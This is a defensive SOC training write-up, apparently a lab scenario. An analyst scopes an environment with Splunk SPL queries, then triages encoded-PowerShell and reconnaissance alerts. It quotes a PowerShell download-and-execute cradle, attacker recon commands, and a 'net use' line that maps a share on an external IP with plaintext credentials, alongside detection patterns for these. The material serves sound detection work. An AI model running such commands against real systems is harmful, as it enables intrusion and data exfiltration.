
## Scenario
It is the SOC analysts first day on the job and he has been tasked with learning the organizations structure; such as the hosts in the environment, addressing schemes, log sources that are being ingested and the event ids that may be beneficial when conducting an investigation. 

The new SOC analyst has zero documentation and his leadership has only provided him access to Splunk. Wanting to make a good impression, the SOC analyst begins scoping out the environment where he ends up finding much more than he bargained for on his first day.

---

### Scoping the Environment
To start off, the SOC analyst will want to identify the indexes that are available to search. EventCount is utilized as it reads bucket metadata and costs very little to run.
```SPL
| eventcount summarize=false index=* index=_* report_size=true
| stats sum(count) as events sum(size_bytes) as bytes by index
| eval size_GB=round(bytes/1024/1024/1024,2)
| fields index events size_GB
| sort - events
```
`Notable Indexes Available`
- main
- suricata


---
Second, identifying the source available in the environment will provide insightful context about the types of logs that the organization is ingesting into their SIEM. The source will allow the analyst to more easily determine which logs will be most useful in future investigations. They can also be used to limit the amount of work that the Splunk search engine has to put in, by filtering on events only located in that source.

```SPL
| tstats count min(_time) as firstTime max(_time) as lastTime where index=* earliest=-7d latest=now by index source
| eval hours_since_last=round((now()-lastTime)/3600,1)
| convert ctime(firstTime) ctime(lastTime)
| sort index, -count
```

`Notable Sources Available`
- WinEventLog:Security
- XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
  
---

In a Windows environment, it is critical to know which `Event ID's/Codes` are being logged and which ones are most helpful in identifying indicators of compromise. Due to the enriched data that Sysmon provides, the following query will be used to list the event id's available for sysmon but it will be important to utilize the Security logs as well. Important note that in a production environment millions of logs may be ingested per hour, so it is critical that time stamping is used to minimize the amount of bandwidth that Splunk has to use for the search. The system administrator will thank you for this.

```SPL
index=main source="xmlwineventlog:microsoft-windows-sysmon/operational" earliest=-15m latest=now
| rex field=_raw "<EventID(?:\s[^>]*)?>(?<evt_id>\d+)</EventID>"
| eval event_id=coalesce(EventCode, EventID, evt_id)
| stats count by source event_id
| sort source, -count
```
---

`Field names` are very important to know as they will allow the analyst to filter events in a more granular manner to pin point activity coming from a specific host, user, IP, etc. The field available are going to vary depending on the log source, so it is important to know where the differences are so that the analyst is not missing potentially valuable insight because they had the incorrect field name in the query. For example, some log sources will use the field src_ip, while others will use SourceIP. 

```SPL
index=main source="xmlwineventlog:microsoft-windows-sysmon/operational" 
| head 10000
| fieldsummary maxvals=5
| table field count distinct_count 
| sort - count
```
---

Next, discovering the `host inventory` in the environment is very important as the analyst will be able to determine all the machines that are being logged in the environment, as well as the typical naming conventions being used to identify any anomalies. With the following query, the hosts can be pinpointed per index and a baseline event count can be determined over time to detect if a specific host is getting significantly more traffic than normal in a specified time range.

```SPL
| tstats count latest(_time) as lastSeen where index=* earliest=-24h latest=now by index host
| eval hours_since=round((now()-lastSeen)/3600,1)
| convert ctime(lastSeen)
| sort index, -count
```

`Presumed Tier 0 Hosts Available`
- DC01
- CORP-DC02
- PART-DC01
- BACKUPSVR01

`Presurmed Tier 1 Host Available`
- FILESVR01

`Presumed Tier 2 Hosts Available`
-  WS-HR01
-  WS-IT01 
-  WS-DEV01
-  BEACHHEAD

---

Another very important aspect of scoping out an organizations environment is knowing the accounts within the environment. Using the following query, the accounts that have successfully logged in over a specified period of time can be identified. This could potentially reveal unauthorized account activity  or an account accessing a machine that it should not be accessing. Take note that 4624 events from tier 2 assets will show up on the DC events logs as all domain joined machines constantly connect to the DC itself: to fetch Group Policy, to read the SYSVOL share, for LDAP queries. Each of those is a real network logon to the DC, so the DC writes a 4624.


```SPL
index=main source="wineventlog:security" (EventCode=4624 OR EventID=4624) earliest=24h latest=Now
| eval acct=coalesce(TargetUserName, user),
       comp=coalesce(Computer, ComputerName, dest),
       logon_type=coalesce(LogonType, Logon_Type)
| eval acct_type=if(match(acct, "\$$"), "machine", "user")
| stats count as logons dc(comp) as hosts_accessed values(logon_type) as logon_types latest(_time) as lastSeen by acct acct_type
| convert ctime(lastSeen)
| sort acct_type, -hosts_accessed
```

---

Finally, knowing which IP belongs to which machine gives you the baseline that makes activity interpretable, so an analyst can quickly spot addresses and connections that don't fit. It also ensures that during an investigation you attribute activity to the right host, not to whomever happens to hold that address now. 

The following query is used to map the IP address seen in Windows authentication logs to the domain-joined computer that proved, through a successful Kerberos machine-account authentication, that it was using that address. Any IP without that proof is labeled as claimed-only, conflicting, or unresolved. It is important to note that hosts that dynamically obtain their addresses will have addresses change after lease expiration.

```SPL
index=main source="wineventlog:security" (EventCode=4624 OR EventID=4624 OR EventCode=4768 OR EventID=4768) earliest=04/30/2026:00:00:00 latest=05/01/2026:00:00:00
| eval evt=coalesce(EventCode, EventID),
       acct=if(evt="4768", coalesce(TargetUserName, user, Account_Name), coalesce(TargetUserName, user)),
       ip=replace(coalesce(IpAddress, Source_Network_Address, Client_Address), "^::ffff:", ""),
       auth_pkg=coalesce(AuthenticationPackageName, Authentication_Package),
       result=coalesce(Status, Result_Code),
       claimed=coalesce(WorkstationName, Workstation_Name)
| where match(ip, "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$") AND ip!="127.0.0.1" AND ip!="0.0.0.0"
| eval proven_host=if(match(acct, "\$$") AND ((evt="4768" AND result="0x0") OR (evt="4624" AND auth_pkg="Kerberos")), upper(replace(acct, "\$$", "")), null()),
       claimed=if(claimed="-" OR claimed="", null(), upper(claimed))
| stats values(proven_host) as proven_host values(claimed) as claimed_names min(_time) as firstSeen max(_time) as lastSeen by ip
| eval confidence=case(mvcount(proven_host)=1, "HIGH: machine account proved identity",
                       mvcount(proven_host)>1, "CONFLICT: multiple machine accounts",
                       isnotnull(claimed_names), "LOW: name claimed only",
                       true(), "UNRESOLVED")
| sort confidence
| convert ctime(firstSeen) ctime(lastSeen)
```

`High Confidence IP Mapping`

| Host        | IP           |     
| ----------- | ------------ | 
| DC01        | 10.10.11.249 |     
| CORP-DC02   | 10.10.11.57  |     
| PART-DC01   | 10.10.3.163  |     
| BACKUPSVR01 | 10.10.11.190 |     
| FILESVR01   | 10.10.11.53  |     
| WS-HR01     | 10.10.11.8   |     
| WS-IT01     | 10.10.11.109 |     
| WS-DEV01    | 10.10.11.234 |  
| BEACHHEAD   | 10.10.11.163 |     

<br>

**Important Note**
If this were not a simulated environment, these findings would be very concerning. It appears that this is a /24 environment, where all tier 0 assets are on the same subnet as tier 1 and 2. This is not a proper way to segment an Active Directory environment as if one user workstation were compromised, then they would have direct line of sight with the Domain Controller. 

---

### Level 1 Alerts
After gaining a good understanding of the environment, the SOC analyst was given access to his ticketing system and is now receiving active alerts from the environment. The supervisor tasked the analyst with triaging the alerts based on severity, determining if they are true positives or false positives, and escalating to the level 2 analyst as needed. The current alerts in the analysts bucket are the following

---
#### Alert 1

An alert triggers due to an encoded PowerShell command being ran on multiple different workstations. Before even attempting to decode the command, context points to nefarious behavior as they are coming from an WS-HR01 and BEACHHEAD using regular user accounts. 

```SPL
index=main source="xmlwineventlog:microsoft-windows-sysmon/operational" EventCode=1 
    OriginalFileName IN ("PowerShell.EXE", "pwsh.dll", "powershell_ise.EXE")
| rex field=CommandLine "(?i)(?:^|\s)(?<enc_flag>(?:/|--?|[–—―]{1,2})(?:encodedcommand|encodedcomman|encodedcomma|encodedcomm|encodedcom|encodedco|encodedc|encoded|encode|encod|enco|enc|en|ec|e))\s+['\"]?(?<enc_blob>[A-Za-z0-9+/=]{8,})"
| where isnotnull(enc_blob)
| eval blob_md5=md5(enc_blob), blob_len=len(enc_blob)
| eval s_download=if(match(enc_blob,"RABvAHcAbgBsAG8AYQBk|ZABvAHcAbgBsAG8AYQBk|QAbwB3AG4AbABvAGEA|EAG8AdwBuAGwAbwBhAGQA|kAG8AdwBuAGwAbwBhAGQA"),30,0)
| eval s_webclient=if(match(enc_blob,"VwBlAGIAQwBsAGkAZQBuAHQA|dwBlAGIAYwBsAGkAZQBuAHQA|cAZQBiAEMAbABpAGUAbgB0|cAZQBiAGMAbABpAGUAbgB0|XAGUAYgBDAGwAaQBlAG4A|3AGUAYgBjAGwAaQBlAG4A"),20,0)
| eval s_iex=if(match(enc_blob,"^SQBFAFgA|^aQBlAHgA|SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBu|kAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8A|JAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4A"),25,0)
| eval s_http=if(match(enc_blob,"aAB0AHQA|gAdAB0AHAA|oAHQAdABw"),15,0)
| eval s_nested_b64=if(match(enc_blob,"RgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4A|YAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcA|GAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBn"),20,0)
| eval s_hidden=if(match(CommandLine,"(?i)\s[-/–—―]w\w*\s+['\"]?h"),15,0)
| eval s_bypass=if(match(CommandLine,"(?i)\s[-/–—―]ex?\w*\s+['\"]?(bypass|unrestricted)"),10,0)
| eval s_parent=case(match(ParentImage,"(?i)\\\\(winword|excel|powerpnt|outlook|mshta|wscript|cscript|rundll32|regsvr32)\.exe$"),30, match(ParentImage,"(?i)\\\\(users|programdata|temp)\\\\"),15, true(),0)
| eval risk_score=s_download+s_webclient+s_iex+s_http+s_nested_b64+s_hidden+s_bypass+s_parent
| where risk_score>=25
| stats count min(_time) as firstTime max(_time) as lastTime values(enc_flag) as enc_flag values(CommandLine) as CommandLine max(risk_score) as risk_score by host, user, ParentImage, Image, blob_md5
| convert ctime(firstTime) ctime(lastTime)
| sort 0 - risk_score
```

<br>

</br>

![](attachments/Pasted%20image%2020260927163022.png)

<br>

</br>

This alone may warrant an escalation as there are very limited reasons as to why either of these hosts would be running encoded PowerShell. Just to be certain, CyberChef is used to discover the true functionality of the command.

<br>

</br>

![](attachments/Pasted%20image%2020260927163259.png)

<br>

</br>

The command **`IEX (New-Object System.Net.WebClient).DownloadString("URL")`** is a PowerShell technique used to download a script from a remote web address and execute it directly in memory without saving it to the disk. It can be seen that command is reaching out to an external IP address to download .ps1 script. Looking at threat intel, the IP address appears to owned by Amazon and has no current reports of abuse. It is time to escalate the alert, but to provide more context to the level 2 analyst event code 4104 can be used to identify the scripts contents. 

```SPL
index=main source="WinEventLog:Microsoft-Windows-PowerShell/Operational" host=BEACHHEAD EventCode=4104  
earliest=04/30/2026:11:26:00 latest=04/30/2026:11:28:00
| rex max_match=0 field=ScriptBlockText "(?<Script>[^\r\n]+)"
| table _time, host, ScriptBlockId, Script
```
<br>

</br>

![](attachments/Pasted%20image%2020260927183946.png)

The analysts assertion to escalate the issue has proven to be the right choice as the script appears to execute process hollowing. The recommendation would be to ascertain any events that took place after the scripts execution to identify any IOC's produced that may be helpful identifying if the compromise is limited to the BEACHHEAD and WS-HR01 Hosts. 
<br>
</br>

---
#### Alert 2
The SOC analyst moves on to a new alert regarding an excessive amount of reconnaissance commands being ran on a specific host. The following query aims to discover a variety of common recon commands used.

```SPL
index=main source="xmlwineventlog:microsoft-windows-sysmon/operational" EventCode=1
    (arp* OR chcp* OR ipconfig* OR net* OR nltest* OR ping* OR systeminfo* OR whoami*)
    (process_name IN ("arp.exe","chcp.com","ipconfig.exe","net.exe","net1.exe","nltest.exe","ping.exe","systeminfo.exe","whoami.exe")
     OR OriginalFileName IN ("arp.exe","chcp.com","ipconfig.exe","net.exe","net1.exe","nltest.exe","ping.exe","systeminfo.exe","whoami.exe")
     OR (process_name IN ("cmd.exe","powershell.exe","pwsh.exe") AND process IN ("*arp*","*chcp*","*ipconfig*","*net*","*net1*","*nltest*","*ping*","*systeminfo*","*whoami*")))
| fields _time process_name OriginalFileName process parent_process parent_process_id parent_process_guid ParentProcessGuid host user
| eval parent_guid=coalesce(parent_process_guid, ParentProcessGuid)
| fillnull value="unknown" dest user parent_process parent_process_id parent_guid
| stats dc(process) as unique_cmdlines values(process) as process values(process_name) as process_names count as executions min(_time) as firstSeen max(_time) as lastSeen by host user parent_process parent_process_id parent_guid
| where unique_cmdlines > 3
| eval duration_sec=lastSeen-firstSeen
| sort 0 - unique_cmdlines
| convert ctime(firstSeen) ctime(lastSeen)
```

<br>

</br>

![](attachments/Pasted%20image%2020260927005625.png)

On top of the ping sweep that took place from the host, the following commands were discovered to have been executed. 

<br>

| Command                                                                            | Recon purpose                                                                                                                                                                                                                                                                                                 | MITRE ATT&CK                                        |
| ---------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------- |
| `whoami /all`                                                                      | Shows the current account, its group memberships, and its privileges in one command. Tells the attacker what they can already do on this host. (`whoami`, `/groups`, and `/priv` are subsets of this and are omitted.)                                                                                        | T1033 System Owner/User Discovery                   |
| `systeminfo`                                                                       | Shows the OS version, patch level, domain membership, and hardware. Used to identify missing patches and exploitable weaknesses.                                                                                                                                                                              | T1082 System Information Discovery                  |
| `net localgroup administrators`                                                    | Lists who has local admin on this host, revealing which accounts would be worth stealing credentials from here.                                                                                                                                                                                               | T1069.001 Local Groups                              |
| `net group /domain`                                                                | Lists every group in the domain to map the privilege structure.                                                                                                                                                                                                                                               | T1069.002 Domain Groups                             |
| `net group "Domain Admins" /domain`                                                | Identifies the domain's most privileged accounts, the primary targets for credential theft.                                                                                                                                                                                                                   | T1069.002 Domain Groups                             |
| `net user /domain`                                                                 | Lists all domain user accounts, used as a target list for password spraying or impersonation. (`net group "Domain Users" /domain` returns essentially the same list and is omitted.)                                                                                                                          | T1087.002 Domain Account                            |
| `net user marketing01 /domain`                                                     | Pulls the details of one specific account: group memberships, password last set, and whether it's active. Indicates this account is of particular interest.                                                                                                                                                   | T1087.002 Domain Account                            |
| `net group "Domain Computers" /domain`                                             | Lists every machine joined to the domain, giving the attacker a host inventory for lateral movement.                                                                                                                                                                                                          | T1018 Remote System Discovery                       |
| `net view /domain`                                                                 | Lists the hosts visible on the network, confirming which ones are online and reachable.                                                                                                                                                                                                                       | T1018 Remote System Discovery                       |
| `net view \\10.10.11.249` (also run against `.190` and `.53`)                      | Lists shared folders on specific hosts: DC01, BACKUPSVR01, and .53 (likely FILESVR01, per earlier timing evidence). Checking a backup server and a DC for shares means looking for sensitive data or admin access.                                                                                            | T1135 Network Share Discovery                       |
| `nltest /domain_trusts`                                                            | Lists trust relationships with other domains. That's how an attacker finds paths into connected environments, such as the `partner.local` domain seen earlier.                                                                                                                                                | T1482 Domain Trust Discovery                        |
| `net use \\52.58.62.68\share /user:b4l3ri0n Password123` (also tried with `:8888`) | **Not reconnaissance.** It maps a share on an **external public IP** using credentials typed in plain text. This suggests the attacker is staging tools or exfiltrating data to infrastructure they control. It is the most urgent finding on this list: block the IP and scope every host that contacted it. | Staging or exfiltration (confirm with network data) |

<br>

</br>

At this point, it would be time to escalate to the level 2 analyst as as internal domain joined host is attempting to map a share on an external IP address that was used to download a process hollowing script in the previous alert. It is unclear what the motive is for connecting to this share, but this would need to be further looked into. 

After a quick query searching for the IP address on other machines, it is discovered that the HR machine has made many outbound connections with the "52.58.62.68" with the most notable event being on a non-standard port through a process that is containing a double extension that is located in the users temp folder (common malware drop point). 

<br>

```SPL
index=main source="xmlwineventlog:microsoft-windows-sysmon/operational" host="WS-HR01" "52.58.62.68"  earliest=04/30/2026:10:00:00 latest=04/30/2026:12:30:00   
| sort _time     
| table  _time, host, user, SourceIp, DestinationIp, DestinationPort, Initiated, Image
```

<br>

![](attachments/Pasted%20image%2020260927154723.png)

<br>
It has been validated that the SOC analyst was correct in their decision to escalate the alert. Recommended next steps would be to identify the events that took place on WS-HR01 before and after the connection with the suspicious IP address. 
